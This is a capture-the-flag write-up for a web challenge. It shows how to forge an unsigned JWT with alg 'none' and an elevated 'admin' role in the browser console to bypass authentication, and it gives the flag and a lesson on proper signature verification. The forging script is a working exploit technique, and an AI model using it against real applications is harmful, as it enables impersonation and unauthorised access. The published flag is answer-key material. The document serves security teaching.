# Manager Space

**Challenge title:** Espace Manager\
**Category:** Web\
**Difficulty:** Medium\
**Points:** 100\
**Author:** Perceval

## File

- Application: https://manager.cyberzerk.fr

## Solution

### Step 1: Inspect the authentication token

Open the Manager Space website and inspect the browser storage using DevTools → Console:

```javascript
({
  cookies: document.cookie,
  localStorage: Object.entries(localStorage),
  sessionStorage: Object.entries(sessionStorage)
})
```

The application stored a JWT in the `session` cookie.

The original token had the following decoded header:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Its payload was:

```json
{
  "user": "employee8472",
  "role": "employee"
}
```

### Step 2: Identify the JWT validation weakness

The application displayed an internal development tip stating that the rushed token validation accepted tokens without a signature.

This indicated that the server might accept an unsigned JWT using the `alg: none` algorithm.

### Step 3: Forge an unsigned admin JWT

Create a new JWT with the same user identifier, change the role to `admin`, set the algorithm to `none`, and leave the signature section empty.

Run the following code in DevTools → Console:

```javascript
const header = {
  alg: "none",
  typ: "JWT"
};

const payload = {
  user: "employee8472",
  role: "admin"
};

const encode = obj =>
  btoa(JSON.stringify(obj))
    .replace(/=/g, "")
    .replace(/\\+/g, "-")
    .replace(/\\//g, "_");

const token = encode(header) + "." + encode(payload) + ".";

document.cookie = `session=${token}; path=/`;

location.reload();
```

### Step 4: Access the manager area

After refreshing the page, the application accepted the unsigned token and displayed the admin role.

The CODIR bonus table became accessible:

| Beneficiary | Prime Movember |
|---|---:|
| General Manager | €42,000 |
| HR Director | €18,500 |
| Technical team (12 people) | 0 € |

### Step 5: Obtain the flag

The flag was displayed below the bonus table.

## Flag

```text
CyberZerk{JWT_4lg_N0n3_C_3st_N0n}
```

## Security Lesson

This challenge demonstrates JWT signature verification failure. The application accepted a token using the unsecured `none` algorithm, allowing the client to modify the role claim and impersonate an administrator.

Applications must enforce an explicit allowlist of secure signing algorithms and reject unsigned tokens. JWT signatures must always be verified server-side before trusting identity or authorization claims.
